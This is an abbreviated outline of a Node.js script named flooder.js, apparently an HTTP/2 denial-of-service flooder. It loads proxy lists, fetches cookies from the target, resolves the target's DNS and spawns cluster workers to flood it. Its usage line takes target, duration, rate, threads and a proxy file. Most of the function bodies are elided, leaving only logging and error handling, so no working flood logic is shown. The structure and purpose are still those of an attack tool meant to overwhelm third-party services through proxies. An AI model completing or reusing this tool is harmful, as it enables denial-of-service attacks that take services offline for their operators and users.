...
class Utils {
    ...
    static async resolveDNS(host) {
        try {
            ...
            console.error(`[ERROR] DNS resolution failed: ${err.message}`.red);
            return host;
        }
    }
}
...
async function fetchCookies(target, proxy) {
    ...
    try {
        ...
        console.error(`[ERROR] Cookie fetch failed: ${err.message}`.red);
        return null;
    }
}
...
class Flooder {
    ...
    async initialize() {
        try {
            ...
            console.log(`[INFO] Loaded ${this.proxies.length} proxies`.green);
            console.log(`[INFO] Resolved target to ${this.target.host}`.green);
        } catch (error) {
    ...
    async start() {
        ...
        if (cluster.isMaster) {
            console.log(`[INFO] Starting ${this.threads} workers`.cyan);
    ...
    runWorker() {
        const runFlooder = async () => {
            ...
            try {
                ...
                client.on('error', (err) => {
                    console.error(`[ERROR] HTTP/2 error: ${err.message}`.red);
                    client.destroy();
                    tlsConn.destroy();
                    connection.destroy();
                });
                ...
                console.error(`[ERROR] Flood error: ${err.message}`.red);
            }
        };
...
if (process.argv.length < 7) {
    console.log('Usage: node flooder.js <target> <time> <rate> <threads> <proxyfile> [--cache] [--socks]'.yellow);
    process.exit(1);
}
...
async function main() {
    ...
    try {
        ...
        console.error(`[ERROR] Startup failed: ${error.message}`.red);
        process.exit(1);
    }
}

main().catch(error => console.error(`[ERROR] Main failed: ${error.message}`.red));